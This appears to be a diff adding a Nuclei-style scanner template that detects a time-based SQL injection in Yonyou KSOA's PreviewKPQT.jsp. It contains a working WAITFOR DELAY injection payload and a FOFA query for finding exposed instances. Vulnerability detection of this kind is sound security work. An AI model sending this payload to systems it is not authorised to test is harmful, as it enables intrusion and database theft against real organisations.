@@ -1,0 +1,27 @@
+id: yonyou-ksoa-previewkpqt-sqli
+
+info:
+  name: 用友时空 KSOA PreviewKPQT.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 用友时空KSOA的 `PreviewKPQT.jsp` 接口存在SQL注入漏洞，攻击者可以利用该漏洞执行任意SQL语句，从而获取数据库中的敏感信息或控制数据库服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3PreviewKPQT.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-时空KSOA"
+  tags: sqli, yonyou, ksoa, oa,  time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
